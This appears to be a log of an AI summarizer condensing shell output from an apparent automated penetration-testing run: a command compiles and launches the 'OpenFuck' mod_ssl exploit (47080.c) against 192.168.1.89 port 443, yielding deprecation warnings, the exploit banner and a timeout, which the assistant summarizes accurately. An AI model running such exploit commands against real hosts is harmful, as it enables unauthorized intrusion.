@@ -1,0 +1,152 @@
+TOTAL_INPUT_TOKEN: 5402
+TOTAL_COMPLETION_TOKENS: 143
+TOTAL_TOKEN: 5545
+TOTAL_TOOL_CALL: 0
+TOTAL_API_CALLS: 1
+TOTAL_USER_INPUT: 5402
+
+developer:
+You are a summarizer. Your goal is to summarize results of executed shell commandfollowing 2 simple rules:
+1 - If the result of the command is not long, leave it as it is.
+2 - If the result of the command is really long you'll have to summarizeit keeping everything that is important
+
+user:
+command:{'command': 'gcc -o openfuck 47080.c -lcrypto && ./openfuck 192.168.1.89 443 -offset'}
+result:
+[01m[K47080.c:[m[K In function ‘[01m[Kread_ssl_packet[m[K’:
+[01m[K47080.c:534:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KRC4[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  534 |                 [01;35m[KRC4[m[K(ssl->rc4_read_key, rec_len, buf, buf);
+      |                 [01;35m[K^~~[m[K
+In file included from [01m[K47080.c:26[m[K:
+[01m[K/usr/include/openssl/rc4.h:37:28:[m[K [01;36m[Knote: [m[Kdeclared here
+   37 | OSSL_DEPRECATEDIN_3_0 void [01;36m[KRC4[m[K(RC4_KEY *key, size_t len,
+      |                            [01;36m[K^~~[m[K
+[01m[K47080.c:[m[K In function ‘[01m[Ksend_ssl_packet[m[K’:
+[01m[K47080.c:583:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Init[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  583 |                 [01;35m[KMD5_Init[m[K(&ctx);
+      |                 [01;35m[K^~~~~~~~[m[K
+In file included from [01m[K47080.c:27[m[K:
+[01m[K/usr/include/openssl/md5.h:49:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   49 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Init[m[K(MD5_CTX *c);
+      |                           [01;36m[K^~~~~~~~[m[K
+[01m[K47080.c:584:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  584 |                 [01;35m[KMD5_Update[m[K(&ctx, ssl->write_key, RC4_KEY_LENGTH);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:585:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  585 |                 [01;35m[KMD5_Update[m[K(&ctx, rec, rec_len);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:586:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  586 |                 [01;35m[KMD5_Update[m[K(&ctx, &seq, 4);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:587:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Final[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  587 |                 [01;35m[KMD5_Final[m[K(p, &ctx);
+      |                 [01;35m[K^~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:51:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   51 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Final[m[K(unsigned char *md, MD5_CTX *c);
+      |                           [01;36m[K^~~~~~~~~[m[K
+[01m[K47080.c:594:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KRC4[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  594 |                 [01;35m[KRC4[m[K(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
+      |                 [01;35m[K^~~[m[K
+[01m[K/usr/include/openssl/rc4.h:37:28:[m[K [01;36m[Knote: [m[Kdeclared here
+   37 | OSSL_DEPRECATEDIN_3_0 void [01;36m[KRC4[m[K(RC4_KEY *key, size_t len,
+      |                            [01;36m[K^~~[m[K
+[01m[K47080.c:[m[K In function ‘[01m[Ksend_client_master_key[m[K’:
+[01m[K47080.c:748:9:[m[K [01;35m[Kwarning: [m[K‘[01m[KEVP_PKEY_get1_RSA[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  748 |         [01;35m[Kif[m[K (EVP_PKEY_get1_RSA(pkey) == NULL) {
+      |         [01;35m[K^~[m[K
+In file included from [01m[K/usr/include/openssl/x509.h:29[m[K,
+                 from [01m[K/usr/include/openssl/ssl.h:32[m[K,
+                 from [01m[K47080.c:21[m[K:
+[01m[K/usr/include/openssl/evp.h:1365:16:[m[K [01;36m[Knote: [m[Kdeclared here
+ 1365 | struct rsa_st *[01;36m[KEVP_PKEY_get1_RSA[m[K(EVP_PKEY *pkey);
+      |                [01;36m[K^~~~~~~~~~~~~~~~~[m[K
+[01m[K47080.c:754:9:[m[K [01;35m[Kwarning: [m[K‘[01m[KRSA_public_encrypt[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  754 |         [01;35m[Kencrypted_key_length[m[K = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
+      |         [01;35m[K^~~~~~~~~~~~~~~~~~~~[m[K
+In file included from [01m[K/usr/include/openssl/x509.h:36[m[K:
+[01m[K/usr/include/openssl/rsa.h:293:5:[m[K [01;36m[Knote: [m[Kdeclared here
+  293 | int [01;36m[KRSA_public_encrypt[m[K(int flen, const unsigned char *from, unsigned char *to,
+      |     [01;36m[K^~~~~~~~~~~~~~~~~~[m[K
+[01m[K47080.c:754:9:[m[K [01;35m[Kwarning: [m[K‘[01m[KEVP_PKEY_get1_RSA[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  754 |         [01;35m[Kencrypted_key_length[m[K = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
+      |         [01;35m[K^~~~~~~~~~~~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/evp.h:1365:16:[m[K [01;36m[Knote: [m[Kdeclared here
+ 1365 | struct rsa_st *[01;36m[KEVP_PKEY_get1_RSA[m[K(EVP_PKEY *pkey);
+      |                [01;36m[K^~~~~~~~~~~~~~~~~[m[K
+[01m[K47080.c:[m[K In function ‘[01m[Kgenerate_key_material[m[K’:
+[01m[K47080.c:791:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Init[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  791 |                 [01;35m[KMD5_Init[m[K(&ctx);
+      |                 [01;35m[K^~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:49:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   49 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Init[m[K(MD5_CTX *c);
+      |                           [01;36m[K^~~~~~~~[m[K
+[01m[K47080.c:793:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  793 |                 [01;35m[KMD5_Update[m[K(&ctx,ssl->master_key,RC4_KEY_LENGTH);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:794:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  794 |                 [01;35m[KMD5_Update[m[K(&ctx,&c,1);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:796:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  796 |                 [01;35m[KMD5_Update[m[K(&ctx,ssl->challenge,CHALLENGE_LENGTH);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:797:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Update[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  797 |                 [01;35m[KMD5_Update[m[K(&ctx,ssl->conn_id, ssl->conn_id_length);
+      |                 [01;35m[K^~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:50:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   50 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Update[m[K(MD5_CTX *c, const void *data, size_t len);
+      |                           [01;36m[K^~~~~~~~~~[m[K
+[01m[K47080.c:798:17:[m[K [01;35m[Kwarning: [m[K‘[01m[KMD5_Final[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  798 |                 [01;35m[KMD5_Final[m[K(km,&ctx);
+      |                 [01;35m[K^~~~~~~~~[m[K
+[01m[K/usr/include/openssl/md5.h:51:27:[m[K [01;36m[Knote: [m[Kdeclared here
+   51 | OSSL_DEPRECATEDIN_3_0 int [01;36m[KMD5_Final[m[K(unsigned char *md, MD5_CTX *c);
+      |                           [01;36m[K^~~~~~~~~[m[K
+[01m[K47080.c:[m[K In function ‘[01m[Kgenerate_session_keys[m[K’:
+[01m[K47080.c:807:9:[m[K [01;35m[Kwarning: [m[K‘[01m[KRC4_set_key[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  807 |         [01;35m[KRC4_set_key[m[K(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
+      |         [01;35m[K^~~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/rc4.h:35:28:[m[K [01;36m[Knote: [m[Kdeclared here
+   35 | OSSL_DEPRECATEDIN_3_0 void [01;36m[KRC4_set_key[m[K(RC4_KEY *key, int len,
+      |                            [01;36m[K^~~~~~~~~~~[m[K
+[01m[K47080.c:811:9:[m[K [01;35m[Kwarning: [m[K‘[01m[KRC4_set_key[m[K’ is deprecated: Since OpenSSL 3.0 [[01;35m[K-Wdeprecated-declarations[m[K]
+  811 |         [01;35m[KRC4_set_key[m[K(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
+      |         [01;35m[K^~~~~~~~~~~[m[K
+[01m[K/usr/include/openssl/rc4.h:35:28:[m[K [01;36m[Knote: [m[Kdeclared here
+   35 | OSSL_DEPRECATEDIN_3_0 void [01;36m[KRC4_set_key[m[K(RC4_KEY *key, int len,
+      |                            [01;36m[K^~~~~~~~~~~[m[K
+
+*******************************************************************
+* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Establishing SSL connection
+Connection to 443:0 failed: Connection timed out
+
+assistant:
+The command compiled a C program (`47080.c`) using `gcc` and attempted to execute it with parameters. The compilation process generated several warnings indicating the use of deprecated functions such as `RC4`, `MD5_Init`, `MD5_Update`, `MD5_Final`, and `RC4_set_key` from the OpenSSL library, which have been deprecated since OpenSSL 3.0.
+
+Upon execution, the program output a banner of "OpenFuck v3.0.4-root priv8 by SPABAM" and attempted to establish an SSL connection to IP address 192.168.1.89 on port 443. However, the connection attempt failed due to a timeout.
